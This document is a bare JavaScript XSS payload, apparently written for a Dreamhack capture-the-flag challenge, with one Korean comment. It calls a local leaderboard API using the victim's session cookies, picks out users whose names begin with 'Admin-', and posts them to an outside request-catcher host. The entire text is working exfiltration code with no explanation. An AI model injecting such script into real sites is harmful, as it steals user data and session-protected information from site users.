<script>
async function findAdminInLeaderboard() {
    try {
        const leaderboardResp = await fetch('http://127.0.0.1:5555/api/leaderboard', {
            credentials: 'include'
        });
        
        if (leaderboardResp.ok) {
            const leaderboard = await leaderboardResp.json();
            
            // Admin- 으로 시작하는 사용자 찾기
            const adminUsers = leaderboard.users.filter(user => 
                user.username.startsWith('Admin-')
            );
            
            await fetch('https://dvgkpfj.request.dreamhack.games', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'admin_users_found',
                    admins: adminUsers
                }),
                mode: 'no-cors'
            });
        }
    } catch (e) {
        console.log('Failed to get leaderboard:', e);
    }
}
</script>
